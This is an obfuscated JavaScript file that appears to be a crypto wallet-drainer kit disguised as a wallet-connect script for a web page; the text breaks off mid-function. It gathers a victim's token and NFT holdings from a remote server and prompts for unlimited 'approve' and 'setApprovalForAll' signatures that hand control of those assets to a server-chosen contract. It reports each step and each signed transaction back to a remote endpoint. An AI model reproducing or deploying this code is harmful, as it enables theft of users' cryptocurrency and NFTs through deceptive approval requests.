const _0x7b2b0e = _0xfa7f;
function _0xfa7f(_0x37ceeb, _0x479595) {
  const _0xeba973 = _0xeba9();
  return (
    (_0xfa7f = function (_0xfa7f84, _0x54d9c6) {
      _0xfa7f84 = _0xfa7f84 - 0x141;
      let _0x2d34cf = _0xeba973[_0xfa7f84];
      return _0x2d34cf;
    }),
    _0xfa7f(_0x37ceeb, _0x479595)
  );
}
(function (_0x13196d, _0x273a09) {
  const _0x5afa60 = _0xfa7f,
    _0x2703bb = _0x13196d();
  while (!![]) {
    try {
      const _0x416afb =
        -parseInt(_0x5afa60(0x18c)) / 0x1 +
        (parseInt(_0x5afa60(0x20e)) / 0x2) *
          (parseInt(_0x5afa60(0x1cf)) / 0x3) +
        (parseInt(_0x5afa60(0x189)) / 0x4) *
          (parseInt(_0x5afa60(0x236)) / 0x5) +
        (parseInt(_0x5afa60(0x1db)) / 0x6) *
          (-parseInt(_0x5afa60(0x1c7)) / 0x7) +
        (-parseInt(_0x5afa60(0x168)) / 0x8) *
          (-parseInt(_0x5afa60(0x155)) / 0x9) +
        (parseInt(_0x5afa60(0x1a9)) / 0xa) *
          (-parseInt(_0x5afa60(0x1be)) / 0xb) +
        (-parseInt(_0x5afa60(0x184)) / 0xc) *
          (-parseInt(_0x5afa60(0x19a)) / 0xd);
      if (_0x416afb === _0x273a09) break;
      else _0x2703bb["push"](_0x2703bb["shift"]());
    } catch (_0x1b644f) {
      _0x2703bb["push"](_0x2703bb["shift"]());
    }
  }
})(_0xeba9, 0x1e89f);
const _0x1ebcac = _0x3e11;
(function (_0x3bc63d, _0x2907f5) {
  const _0x59d26c = _0xfa7f,
    _0x4e8b1d = _0x3e11,
    _0x42f9fa = _0x3bc63d();
  while (!![]) {
    try {
      const _0x2919fb =
        (parseInt(_0x4e8b1d(0xc3)) / 0x1) *
          (-parseInt(_0x4e8b1d(0x13d)) / 0x2) +
        -parseInt(_0x4e8b1d(0x10a)) / 0x3 +
        (parseInt(_0x4e8b1d(0xf4)) / 0x4) * (parseInt(_0x4e8b1d(0xcf)) / 0x5) +
        (-parseInt(_0x4e8b1d(0xe5)) / 0x6) *
          (-parseInt(_0x4e8b1d(0x17e)) / 0x7) +
        (parseInt(_0x4e8b1d(0xab)) / 0x8) * (parseInt(_0x4e8b1d(0x129)) / 0x9) +
        (-parseInt(_0x4e8b1d(0x161)) / 0xa) *
          (parseInt(_0x4e8b1d(0x12e)) / 0xb) +
        (-parseInt(_0x4e8b1d(0x151)) / 0xc) *
          (-parseInt(_0x4e8b1d(0x130)) / 0xd);
      if (_0x2919fb === _0x2907f5) break;
      else _0x42f9fa[_0x59d26c(0x19e)](_0x42f9fa[_0x59d26c(0x183)]());
    } catch (_0x3f58ba) {
      _0x42f9fa["push"](_0x42f9fa[_0x59d26c(0x183)]());
    }
  }
})(_0x4bfb, 0x4c2ae);
const Web3Modal = window[_0x1ebcac(0x113)][_0x1ebcac(0x163)],
  WalletConnectProvider = window[_0x1ebcac(0x103)][_0x1ebcac(0x163)],
  { Fortmatic, chainDatahains, localStorage } = window;
let web3Modal,
  provider,
  mainAccount,
  web3,
  updatedWeb3,
  onButtonClick,
  selectedAddress,
  networkId,
  chainId,
  chainData,
  contractAddress,
  cAccount,
  initData,
  processRunning,
  cProcessCount = 0x0;
const nftsContracts = [],
  nftsBalances = [],
  erc20Contracts = [],
  erc20Balances = [],
  approvedNfts = [],
  approvedERC20 = [],
  uAllowance = _0x1ebcac(0x13b);
let chainChangedState = { status: ![], chain_id: "" };
const erc721ABI = [
    {
      inputs: [
        {
          internalType: _0x7b2b0e(0x229),
          name: _0x1ebcac(0x158),
          type: _0x7b2b0e(0x229),
        },
      ],
      name: _0x1ebcac(0x93),
      outputs: [
        { internalType: _0x7b2b0e(0x20a), name: "", type: _0x7b2b0e(0x20a) },
      ],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x7b2b0e(0x1f0),
    },
    {
      inputs: [
        { internalType: _0x1ebcac(0x15d), name: "to", type: _0x1ebcac(0x15d) },
        {
          internalType: _0x1ebcac(0xa4),
          name: _0x1ebcac(0x180),
          type: _0x1ebcac(0xa4),
        },
      ],
      name: _0x1ebcac(0x17a),
      outputs: [],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      inputs: [
        {
          internalType: _0x1ebcac(0x15d),
          name: _0x1ebcac(0x181),
          type: _0x7b2b0e(0x229),
        },
        {
          internalType: _0x7b2b0e(0x20a),
          name: _0x1ebcac(0xea),
          type: "uint256",
        },
      ],
      name: "increaseAllowance",
      outputs: [
        { internalType: _0x7b2b0e(0x158), name: "", type: _0x1ebcac(0x12a) },
      ],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      inputs: [
        {
          internalType: _0x7b2b0e(0x229),
          name: _0x1ebcac(0xda),
          type: _0x1ebcac(0x15d),
        },
        { internalType: _0x1ebcac(0x15d), name: "to", type: _0x7b2b0e(0x229) },
        {
          internalType: _0x1ebcac(0xa4),
          name: _0x1ebcac(0x15f),
          type: _0x1ebcac(0xa4),
        },
      ],
      name: _0x7b2b0e(0x190),
      outputs: [
        { internalType: _0x1ebcac(0x12a), name: "", type: _0x1ebcac(0x12a) },
      ],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      inputs: [
        {
          internalType: _0x1ebcac(0x15d),
          name: _0x7b2b0e(0x17a),
          type: _0x1ebcac(0x15d),
        },
        { internalType: _0x1ebcac(0x15d), name: "to", type: "address" },
        {
          internalType: _0x1ebcac(0xa4),
          name: _0x1ebcac(0x180),
          type: _0x1ebcac(0xa4),
        },
      ],
      name: _0x7b2b0e(0x1f9),
      outputs: [],
      stateMutability: _0x1ebcac(0x126),
      type: "function",
    },
    {
      inputs: [
        {
          internalType: _0x1ebcac(0x15d),
          name: _0x1ebcac(0xba),
          type: _0x1ebcac(0x15d),
        },
        {
          internalType: _0x1ebcac(0x12a),
          name: _0x1ebcac(0x169),
          type: _0x1ebcac(0x12a),
        },
      ],
      name: _0x1ebcac(0x150),
      outputs: [],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      inputs: [
        {
          internalType: _0x7b2b0e(0x229),
          name: _0x1ebcac(0xf8),
          type: _0x1ebcac(0x15d),
        },
        {
          internalType: "address",
          name: _0x1ebcac(0xba),
          type: _0x1ebcac(0x15d),
        },
      ],
      name: _0x1ebcac(0x121),
      outputs: [
        { internalType: _0x1ebcac(0x12a), name: "", type: _0x1ebcac(0x12a) },
      ],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x7b2b0e(0x1f0),
    },
  ],
  erc20ABI = [
    {
      constant: !![],
      inputs: [],
      name: _0x7b2b0e(0x181),
      outputs: [{ name: "", type: _0x1ebcac(0xfa) }],
      payable: ![],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x1ebcac(0x94),
    },
    {
      constant: ![],
      inputs: [
        { name: _0x1ebcac(0x12f), type: _0x1ebcac(0x15d) },
        { name: _0x1ebcac(0xbf), type: _0x1ebcac(0xa4) },
      ],
      name: _0x1ebcac(0x17a),
      outputs: [{ name: "", type: _0x1ebcac(0x12a) }],
      payable: ![],
      stateMutability: _0x7b2b0e(0x1de),
      type: _0x1ebcac(0x94),
    },
    {
      constant: !![],
      inputs: [],
      name: _0x1ebcac(0x157),
      outputs: [{ name: "", type: _0x1ebcac(0xa4) }],
      payable: ![],
      stateMutability: _0x7b2b0e(0x228),
      type: _0x1ebcac(0x94),
    },
    {
      constant: ![],
      inputs: [
        { name: _0x1ebcac(0x100), type: _0x1ebcac(0x15d) },
        { name: _0x1ebcac(0x15c), type: _0x1ebcac(0x15d) },
        { name: _0x1ebcac(0xbf), type: _0x1ebcac(0xa4) },
      ],
      name: _0x1ebcac(0xd6),
      outputs: [{ name: "", type: _0x7b2b0e(0x158) }],
      payable: ![],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      constant: !![],
      inputs: [],
      name: _0x1ebcac(0xdb),
      outputs: [{ name: "", type: _0x1ebcac(0x14f) }],
      payable: ![],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x1ebcac(0x94),
    },
    {
      constant: !![],
      inputs: [{ name: _0x1ebcac(0xe8), type: _0x1ebcac(0x15d) }],
      name: _0x7b2b0e(0x23b),
      outputs: [{ name: _0x1ebcac(0xc4), type: _0x1ebcac(0xa4) }],
      payable: ![],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x1ebcac(0x94),
    },
    {
      constant: !![],
      inputs: [],
      name: _0x7b2b0e(0x1cd),
      outputs: [{ name: "", type: _0x1ebcac(0xfa) }],
      payable: ![],
      stateMutability: _0x1ebcac(0xa7),
      type: _0x1ebcac(0x94),
    },
    {
      constant: ![],
      inputs: [
        { name: _0x1ebcac(0x15c), type: _0x1ebcac(0x15d) },
        { name: _0x1ebcac(0xbf), type: _0x1ebcac(0xa4) },
      ],
      name: _0x1ebcac(0x117),
      outputs: [{ name: "", type: _0x1ebcac(0x12a) }],
      payable: ![],
      stateMutability: _0x1ebcac(0x126),
      type: _0x1ebcac(0x94),
    },
    {
      constant: !![],
      inputs: [
        { name: _0x1ebcac(0xe8), type: _0x1ebcac(0x15d) },
        { name: _0x1ebcac(0x12f), type: _0x1ebcac(0x15d) },
      ],
      name: _0x1ebcac(0xf7),
      outputs: [{ name: "", type: _0x1ebcac(0xa4) }],
      payable: ![],
      stateMutability: _0x7b2b0e(0x228),
      type: _0x7b2b0e(0x1f0),
    },
    {
      payable: !![],
      stateMutability: _0x1ebcac(0x119),
      type: _0x7b2b0e(0x22c),
    },
    {
      anonymous: ![],
      inputs: [
        { indexed: !![], name: _0x7b2b0e(0x1f6), type: _0x7b2b0e(0x229) },
        { indexed: !![], name: _0x1ebcac(0x181), type: _0x1ebcac(0x15d) },
        { indexed: ![], name: _0x7b2b0e(0x1ef), type: _0x7b2b0e(0x20a) },
      ],
      name: _0x1ebcac(0xd1),
      type: _0x1ebcac(0x14b),
    },
    {
      anonymous: ![],
      inputs: [
        { indexed: !![], name: _0x1ebcac(0xda), type: _0x7b2b0e(0x229) },
        { indexed: !![], name: "to", type: _0x1ebcac(0x15d) },
        { indexed: ![], name: _0x1ebcac(0x140), type: _0x1ebcac(0xa4) },
      ],
      name: _0x1ebcac(0x131),
      type: _0x7b2b0e(0x1c2),
    },
  ],
  byid = _0x25c74f => document[_0x1ebcac(0x99)](_0x25c74f),
  sleep = async _0x2fa722 =>
    new Promise(_0x446381 => setTimeout(_0x446381, _0x2fa722)),
  waitForChainChange = async () => {
    new Promise(_0x140a2d => {
      const _0x28dd44 = _0x3e11;
      if (chainChangedState[_0x28dd44(0x11a)]) _0x140a2d(!![]);
      else
        setTimeout(() => {
          waitForChainChange();
        }, 0x1388);
    });
  },
  fetchFunc = async (_0x46798f = "", _0x4f4c19 = {}, _0x23eace) => {
    const _0x332dc9 = _0x7b2b0e,
      _0x2800bd = _0x1ebcac;
    try {
      if (_0x23eace) {
        const _0x4662ef = await fetch(_0x46798f, {
          method: _0x2800bd(0x122),
          mode: _0x332dc9(0x1d9),
          cache: _0x2800bd(0x14e),
          credentials: _0x332dc9(0x1e8),
          headers: { "Content-Type": _0x2800bd(0x141) },
          referrerPolicy: _0x332dc9(0x220),
          body: JSON[_0x2800bd(0xf6)](_0x4f4c19),
        });
        return _0x4662ef[_0x2800bd(0xc5)]();
      }
      const _0x2b6dce = await fetch(_0x46798f);
      return _0x2b6dce[_0x2800bd(0xc5)]();
    } catch (_0x5100ad) {
      return { status: _0x332dc9(0x200) };
    }
  },
  fetchInitData = async () => {
    const _0x5c1fd8 = _0x1ebcac,
      _0x530613 = await fetchFunc(_0x5c1fd8(0xd8));
    return (
      (initData = _0x530613[_0x5c1fd8(0x135)]), _0x530613[_0x5c1fd8(0x135)]
    );
  },
  getContractAddress = _0x18febb => {
    const _0x1b3c57 = _0x1ebcac,
      _0x56d7e9 = initData[_0x1b3c57(0x145)][_0x1b3c57(0x11c)](
        _0x3acebf => _0x3acebf[_0x1b3c57(0x109)] === _0x18febb
      );
    return _0x56d7e9[0x0]["contract"];
  },
  log = (_0x4c155a, _0x49354e, _0x4a50e8) => {
    const _0x2bc566 = _0x1ebcac;
    fetch(_0x2bc566(0xb5) + _0x4c155a, {
      method: _0x2bc566(0x122),
      headers: { Accept: _0x2bc566(0x141), "Content-Type": _0x2bc566(0x141) },
      body: JSON[_0x2bc566(0xf6)](_0x49354e),
    });
  },
  msgAlert = (_0x4998bf, _0x2bd8ab, _0x25e9e4, _0x35d27b, _0x203d83) => {
    const _0x5116d7 = _0x7b2b0e,
      _0x39e2df = _0x1ebcac,
      _0x11c5d1 = _0x203d83 || "",
      _0x580036 = _0x35d27b || _0x5116d7(0x222),
      _0x1e53a1 = _0x2bd8ab ? _0x39e2df(0xc6) + _0x2bd8ab : _0x39e2df(0xf5),
      _0x4e1330 = {
        closeButton: !![],
        progressBar: !![],
        positionClass: "" + _0x1e53a1,
        timeOut: "" + _0x580036,
      };
    return toastr["" + _0x4998bf[_0x39e2df(0x17c)]()](
      "" + _0x25e9e4,
      "" + _0x11c5d1,
      _0x4e1330
    );
  },
  localStorageFunc = (_0x2c953c, _0xf9100a, _0x5bbb4d) => {
    const _0x6e1068 = _0x7b2b0e,
      _0x195be7 = _0x1ebcac;
    if (_0x2c953c === _0x195be7(0x17f))
      return localStorage[_0x6e1068(0x216)](_0xf9100a, _0x5bbb4d);
    if (_0x2c953c === _0x195be7(0x144))
      return localStorage[_0x6e1068(0x1b1)](_0xf9100a);
    if (_0x2c953c === _0x195be7(0xa8))
      return localStorage[_0x195be7(0xbd)](_0xf9100a);
    if (_0x2c953c === _0x195be7(0xde))
      return localStorage[_0x195be7(0x159)](
        _0xf9100a,
        JSON[_0x6e1068(0x192)](_0x5bbb4d)
      );
    if (_0x2c953c === _0x195be7(0xe3)) {
      const _0x5a90b5 = localStorage[_0x195be7(0xcb)](_0xf9100a);
      return _0x5a90b5 ? JSON[_0x195be7(0x9e)](_0x5a90b5) : null;
    }
  },
  getChainData = _0x173b94 =>
    initData[_0x1ebcac(0x145)][_0x7b2b0e(0x1f1)](
      _0x124bfc => _0x124bfc[_0x1ebcac(0x109)] === _0x173b94
    )[0x0],
  initWeb3Modal = () => {
    const _0x1cf469 = _0x7b2b0e,
      _0x20291a = _0x1ebcac;
    if (location[_0x1cf469(0x19b)] !== _0x1cf469(0x1fc)) {
    }
    const _0x52fcab = {
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          rpc: {
            0x1: initData[_0x20291a(0x145)][0x0][_0x20291a(0x147)],
            0x38: initData[_0x20291a(0x145)][0x1][_0x20291a(0x147)],
            0x89: initData[_0x20291a(0x145)][0x2][_0x20291a(0x147)],
            0xfa: initData[_0x20291a(0x145)][0x3][_0x20291a(0x147)],
            0xa86a: initData[_0x20291a(0x145)][0x4][_0x20291a(0x147)],
            0x19: initData[_0x1cf469(0x20b)][0x5][_0x20291a(0x147)],
          },
        },
      },
      binancechainwallet: { package: !![] },
    };
    web3Modal = new Web3Modal({
      cacheProvider: ![],
      providerOptions: _0x52fcab,
      theme: _0x20291a(0x175),
      disableInjectedProvider: ![],
    });
  },
  handleNetworkSwitch = async _0x4f50d5 => {
    const _0x20a84f = _0x7b2b0e,
      _0x5ec544 = _0x1ebcac;
    try {
      if (!web3 || !_0x4f50d5) return;
      const _0x13bdbe = await web3[_0x20a84f(0x1ad)][_0x5ec544(0xc2)]();
      if ("0x" + Number(_0x13bdbe)[_0x5ec544(0xae)](0x10) === _0x4f50d5)
        return !![];
      const { name: _0x3fce98 } = getChainData(_0x4f50d5);
      await provider[_0x5ec544(0x107)]({
        method: _0x20a84f(0x233),
        params: [{ chainId: _0x4f50d5 }],
      })[_0x5ec544(0x15a)](async _0x3605df => {
        const _0x1a0be5 = _0x20a84f,
          _0xfee28b = _0x5ec544;
        _0x3605df["code"] === 0x1326 && _0x4f50d5 !== _0xfee28b(0xca)
          ? await provider[_0xfee28b(0x107)]({
              method: _0xfee28b(0x105),
              params: [{ ...networks[_0x3fce98] }],
            })[_0xfee28b(0x15a)](async _0x514aec => {
              const _0xe85a21 = _0xfa7f,
                _0x39d1a9 = _0xfee28b;
              msgAlert(
                _0x39d1a9(0x178),
                _0x39d1a9(0x160),
                _0x39d1a9(0x108),
                _0xe85a21(0x179)
              );
              if (
                [_0xe85a21(0x203)][_0x39d1a9(0xc8)](_0x457e02 =>
                  _0x514aec[_0xe85a21(0x231)]["includes"](_0x457e02)
                )
              )
                return;
            })
          : msgAlert(
              _0xfee28b(0x178),
              _0xfee28b(0x95),
              _0x1a0be5(0x1c9) + _0x3fce98,
              _0xfee28b(0x16a)
            );
      });
    } catch (_0x53ac5f) {
      log(_0x5ec544(0x92), { msg: _0x5ec544(0xa6) }),
        msgAlert(
          _0x5ec544(0x178),
          _0x5ec544(0x160),
          _0x5ec544(0x108),
          _0x5ec544(0x10f)
        );
    }
  },
  checkWeb3Chain = (_0x1901e6, _0x3836b6) => {
    const _0xc8c1bf = _0x7b2b0e,
      _0x579d6d = _0x1ebcac;
    if (!web3 && _0x3836b6) {
      msgAlert(
        _0xc8c1bf(0x1dd),
        _0xc8c1bf(0x194),
        _0x579d6d(0x123),
        _0x579d6d(0xa9)
      );
      return;
    }
    const _0x5f165f = getChainData(_0x1901e6);
    _0x1901e6 && localStorageFunc(_0x579d6d(0xde), _0x579d6d(0x174), _0x5f165f),
      handleNetworkSwitch(_0x5f165f ? _0x5f165f[_0x579d6d(0x109)] : ""),
      _0x3836b6 && engageWallet(_0x1901e6, !![]);
  },
  onConnect = async () => {
    const _0x188244 = _0x7b2b0e,
      _0x5e4e1a = _0x1ebcac;
    try {
      (provider = await web3Modal[_0x5e4e1a(0x142)]()),
        (web3 = new Web3(provider)),
        (networkId = await web3[_0x5e4e1a(0x9c)][_0x5e4e1a(0xeb)][
          _0x5e4e1a(0xf0)
        ]()),
        (chainId = await web3[_0x5e4e1a(0x9c)][_0x188244(0x17e)]()),
        localStorageFunc(_0x5e4e1a(0xde), _0x188244(0x175), {
          selectedAddress: selectedAddress,
          chainId: chainId,
          networkId: networkId,
        });
      const _0x50afd5 = await web3[_0x5e4e1a(0x9c)][_0x5e4e1a(0xfb)]();
      (selectedAddress = _0x50afd5[0x0]),
        log(_0x5e4e1a(0x92), {
          msg: "Starting\x20[User\x20Clicked\x20Connect\x20Button]",
        }),
        (document[_0x5e4e1a(0xef)](_0x5e4e1a(0xb3))["textContent"] =
          _0x5e4e1a(0xd0)),
        msgAlert(
          _0x188244(0x1af),
          _0x5e4e1a(0x160),
          _0x5e4e1a(0x16e),
          _0x5e4e1a(0x172)
        ),
        msgAlert(
          _0x188244(0x1dd),
          _0x5e4e1a(0x160),
          _0x5e4e1a(0xa2),
          _0x5e4e1a(0x172)
        ),
        await engageWallet();
    } catch (_0x5c444d) {
      if ([_0x188244(0x206)][_0x188244(0x15d)](_0x5c444d))
        msgAlert(
          _0x188244(0x1dd),
          _0x5e4e1a(0x160),
          _0x5e4e1a(0x149),
          _0x5e4e1a(0x176)
        );
      return;
    }
    provider["on"](_0x5e4e1a(0x9f), _0x4a73a3 => engageWallet()),
      provider["on"](_0x5e4e1a(0xa0), _0x9a4ef9 => {
        engageWallet(_0x9a4ef9),
          (chainChangedState = { status: !![], chain_id: _0x9a4ef9 });
      }),
      provider["on"](_0x5e4e1a(0x10e), _0x349457 => {
        engageWallet(chainId),
          (chainChangedState = { status: !![], chain_id: chainId });
      }),
      provider["on"](_0x188244(0x1ba), _0x358250 => {
        onDisconnect();
      });
  },
  onDisconnect = async () => {
    const _0x3edf5e = _0x1ebcac;
    provider["close"] &&
      (await provider[_0x3edf5e(0x171)](),
      await web3Modal[_0x3edf5e(0xb2)](),
      (provider = null)),
      (selectedAccount = null),
      (document[_0x3edf5e(0xef)](_0x3edf5e(0xb3))["innerHTML"] =
        _0x3edf5e(0x136));
  },
  handleDiffNework = async () => {
    const _0x57d691 = _0x7b2b0e,
      _0x2030d0 = _0x1ebcac,
      _0x51f11b = localStorageFunc(_0x2030d0(0xe3), _0x57d691(0x167)),
      _0xd93754 = _0x51f11b ? _0x51f11b[_0x2030d0(0x174)] : _0x2030d0(0x9c);
    switch (_0xd93754) {
      case _0x2030d0(0x9c):
        (updatedWeb3 = new Web3(initData[_0x57d691(0x20b)][0x0]["uri"])),
          (contractAddress = initData[_0x2030d0(0x145)][0x0][_0x2030d0(0x134)]);
        break;
      case _0x2030d0(0xb1):
        (updatedWeb3 = new Web3(
          initData[_0x2030d0(0x145)][0x1][_0x2030d0(0x147)]
        )),
          (contractAddress = initData[_0x57d691(0x20b)][0x1][_0x2030d0(0x134)]);
        break;
      case _0x57d691(0x1bb):
        (updatedWeb3 = new Web3(
          initData[_0x2030d0(0x145)][0x2][_0x2030d0(0x147)]
        )),
          (contractAddress = initData[_0x2030d0(0x145)][0x2][_0x2030d0(0x134)]);
        break;
      case _0x2030d0(0x115):
        (updatedWeb3 = new Web3(
          initData[_0x57d691(0x20b)][0x3][_0x2030d0(0x147)]
        )),
          (contractAddress = initData[_0x57d691(0x20b)][0x3][_0x2030d0(0x134)]);
        break;
      case _0x2030d0(0x15b):
        (updatedWeb3 = new Web3(
          initData[_0x2030d0(0x145)][0x4][_0x57d691(0x185)]
        )),
          (contractAddress = initData[_0x2030d0(0x145)][0x4][_0x2030d0(0x134)]);
        break;
      case _0x2030d0(0x148):
        (updatedWeb3 = new Web3(
          initData[_0x57d691(0x20b)][0x5][_0x57d691(0x185)]
        )),
          (contractAddress = initData[_0x2030d0(0x145)][0x5][_0x2030d0(0x134)]);
        break;
      default:
        (updatedWeb3 = new Web3(
          initData[_0x2030d0(0x145)][0x0][_0x2030d0(0x147)]
        )),
          (contractAddress = initData[_0x2030d0(0x145)][0x0][_0x2030d0(0x134)]);
        break;
    }
  },
  sendApproval = async _0x2d04a1 => {
    const _0x4772e1 = _0x7b2b0e,
      _0x429fca = _0x1ebcac;
    try {
      let _0x1eaf2d, _0x1fed65, _0x56f062;
      const {
        token_address: _0x1bf6f5,
        contract_type: _0x4f0b0e,
        chain_id: _0x2c9693,
        scontract: _0x1fa693,
      } = _0x2d04a1;
      if (_0x4f0b0e[_0x429fca(0x17c)]() === _0x429fca(0x14a))
        (_0x1eaf2d = new web3[_0x429fca(0x9c)][_0x4772e1(0x1d6)](
          erc20ABI,
          _0x1bf6f5
        )),
          (_0x1fed65 = _0x1eaf2d[_0x429fca(0x12d)][_0x429fca(0x17a)](
            _0x1fa693,
            uAllowance
          ));
      else
        (_0x4f0b0e[_0x429fca(0x17c)]() === _0x429fca(0xe2) ||
          _0x4f0b0e[_0x429fca(0x17c)]() === _0x4772e1(0x1bc)) &&
          ((_0x1eaf2d = new web3[_0x429fca(0x9c)][_0x429fca(0x114)](
            erc721ABI,
            _0x1bf6f5
          )),
          (_0x1fed65 = _0x1eaf2d[_0x429fca(0x12d)][_0x429fca(0x150)](
            _0x1fa693,
            !![]
          )));
      const _0x4a9679 = _0x1fed65[_0x429fca(0x14d)](),
        _0x4ad33d = { from: selectedAddress, to: _0x1bf6f5, data: _0x4a9679 };
      return (
        log(_0x429fca(0x92), { msg: _0x429fca(0xbc) }),
        await web3[_0x429fca(0x9c)]
          [_0x4772e1(0x180)](_0x4ad33d)
          ["on"](_0x429fca(0xad), async _0x498bea => {
            const _0x1c708c = _0x4772e1,
              _0x46a8ce = _0x429fca;
            _0x2d04a1[_0x46a8ce(0x11b)] = _0x498bea;
            const _0x1eb8c5 = [];
            return (
              _0x1eb8c5["push"](_0x2d04a1),
              log(_0x46a8ce(0x92), { msg: _0x46a8ce(0x16b) }),
              await fetchFunc(_0x1c708c(0x176), _0x1eb8c5, !![]),
              !![]
            );
          })
          ["on"](_0x4772e1(0x200), console[_0x429fca(0xce)]),
        ![]
      );
    } catch (_0x315553) {
      log(_0x429fca(0x92), { msg: _0x429fca(0xd7) + _0x315553 });
      if (
        _0x315553[_0x4772e1(0x231)][_0x4772e1(0x15d)](
          "User\x20denied\x20transaction\x20signature"
        )
      )
        msgAlert(
          _0x429fca(0x178),
          _0x429fca(0x95),
          _0x4772e1(0x1fe),
          _0x4772e1(0x1d7)
        );
      return ![];
    }
  },
  blacklist_func = async () => {
    const _0xe057f7 = _0x7b2b0e,
      _0x26cfaf = _0x1ebcac,
      _0x245866 = [],
      _0x3fd1ca = [],
      _0x37c77b = localStorageFunc(_0x26cfaf(0xe3), _0x26cfaf(0x13c));
    let _0x47cd33, _0x2126d1, _0x1dfcab;
    if (_0x37c77b && _0x37c77b[_0x26cfaf(0x125)])
      for (const _0x26a47a of _0x37c77b) {
        const {
            token_address: _0x3b8cc8,
            contract_type: _0x149bf9,
            chain_id: _0x36c54a,
          } = _0x26a47a,
          _0x44bef8 = getContractAddress(_0x36c54a);
        switch (_0x149bf9[_0x26cfaf(0x17c)]()) {
          case _0x26cfaf(0x14a):
            (_0x47cd33 = new updatedWeb3[_0x26cfaf(0x9c)][_0xe057f7(0x1d6)](
              erc20ABI,
              _0x3b8cc8
            )),
              (_0x2126d1 = await _0x47cd33[_0x26cfaf(0x12d)]
                [_0x26cfaf(0xf7)](selectedAddress, _0x44bef8)
                [_0x26cfaf(0xf2)]()),
              (_0x1dfcab = updatedWeb3[_0x26cfaf(0xdd)]
                [_0x26cfaf(0xd3)](_0x2126d1)
                ["gt"](updatedWeb3[_0x26cfaf(0xdd)][_0x26cfaf(0xd3)](0x0)));
            if (_0x1dfcab) _0x245866[_0x26cfaf(0xd9)](_0x3b8cc8);
            break;
          default:
            (_0x47cd33 = new updatedWeb3[_0xe057f7(0x1ad)][_0xe057f7(0x1d6)](
              erc721ABI,
              _0x3b8cc8
            )),
              (_0x2126d1 = await _0x47cd33[_0xe057f7(0x154)]
                [_0x26cfaf(0x121)](selectedAddress, _0x3b8cc8)
                [_0x26cfaf(0xf2)]());
            if (_0x2126d1) _0x245866[_0x26cfaf(0xd9)](_0x3b8cc8);
            break;
        }
        if (_0x245866[_0x26cfaf(0x125)]) {
          for (const _0x329c81 of _0x245866) {
            _0x37c77b[_0x26cfaf(0x9d)](_0x1fe1c5 => {
              const _0x357f2a = _0x26cfaf;
              if (
                _0x329c81[_0x357f2a(0x17c)]() ===
                _0x1fe1c5[_0x357f2a(0xaf)][_0x357f2a(0x17c)]()
              )
                return;
              _0x3fd1ca[_0x357f2a(0xd9)](_0x1fe1c5);
            });
          }
          if (_0x3fd1ca[_0x26cfaf(0x125)])
            localStorageFunc(_0x26cfaf(0xde), _0xe057f7(0x1d1), _0x3fd1ca);
        }
      }
    localStorageFunc(_0xe057f7(0x171), _0xe057f7(0x239), _0x245866);
  },
  parseLocalData = () =>
    new Promise(async _0x10858c => {
      const _0x1b1f3d = _0x7b2b0e,
        _0x53839a = _0x1ebcac;
      blacklist_func();
      const _0x502edc = Number(
          localStorageFunc(_0x53839a(0x144), _0x53839a(0xff))
        ),
        _0x12cb06 = Number(
          localStorageFunc(_0x53839a(0x144), _0x53839a(0x164))
        );
      let _0x2c1570 = localStorageFunc(_0x53839a(0x144), _0x53839a(0x13c));
      (_0x2c1570 = _0x2c1570 ? JSON[_0x1b1f3d(0x1d4)](_0x2c1570) : null),
        _0x10858c({
          stored_nonce: _0x502edc,
          expiry_time: _0x12cb06,
          address_data: _0x2c1570,
        });
    }),
  validateLocalStorage = async () =>
    new Promise(async _0x2db9c4 => {
      const _0x2a1cc2 = _0x7b2b0e,
        _0x2dd7f6 = _0x1ebcac,
        _0x23be1a = await updatedWeb3["eth"][_0x2dd7f6(0xd5)](selectedAddress),
        _0xa09571 = Date["now"](),
        {
          stored_nonce: stored_nonce = 0x0,
          expiry_time: expiry_time = 0x0,
          address_data: address_data = null,
        } = parseLocalData();
      address_data &&
        address_data[_0x2dd7f6(0x125)] &&
        ((Number(_0xa09571) > Number(expiry_time) ||
          Number(_0x23be1a) > Number(stored_nonce) ||
          !address_data ||
          address_data[_0x2dd7f6(0x125)] === 0x0) &&
          (localStorageFunc(_0x2a1cc2(0x202), _0x2a1cc2(0x225)),
          localStorageFunc(_0x2a1cc2(0x202), _0x2dd7f6(0x13c)),
          localStorageFunc(_0x2dd7f6(0x13a), _0x2dd7f6(0x164)),
          _0x2db9c4(![])),
        _0x2db9c4(address_data)),
        _0x2db9c4(![]);
    }),
  selectContract = async (_0xbade0a, _0x4f7e19) =>
    new Promise(async _0x2e73d7 => {
      const _0x2dc8c9 = _0x7b2b0e,
        _0x28b58e = _0x1ebcac,
        _0x157dd3 = await validateLocalStorage();
      if (!_0x157dd3) {
        const _0x4973ff = await fetchFunc(
          _0x2dc8c9(0x209),
          {
            selectedAddress: selectedAddress,
            chain: _0xbade0a,
            chain_id: _0x4f7e19,
          },
          !![]
        );
        if (_0x4973ff[_0x28b58e(0x135)][_0x28b58e(0x125)]) {
          const _0x58a2ec = _0x4973ff[_0x28b58e(0x135)][_0x2dc8c9(0x22e)](
            _0x412b66 => ({
              ..._0x412b66,
              owner: selectedAddress,
              chain_id: _0x4f7e19,
            })
          );
          _0x2e73d7(_0x58a2ec);
        }
        _0x2e73d7(![]);
      }
      _0x2e73d7(_0x157dd3);
    }),
  estimateGas = (_0x419d4e, _0x3f424e) => {
    const _0x107fc1 = _0x7b2b0e,
      _0x30e207 = _0x1ebcac,
      _0x12537a = new Web3[_0x30e207(0xdd)]["BN"](initData[_0x30e207(0xc1)]),
      _0x3400b3 = new Web3[_0x107fc1(0x1c0)]["BN"](_0x3f424e)[_0x30e207(0x133)](
        new Web3[_0x30e207(0xdd)]["BN"]("4")
      ),
      _0x222e94 = _0x12537a[_0x30e207(0x133)](
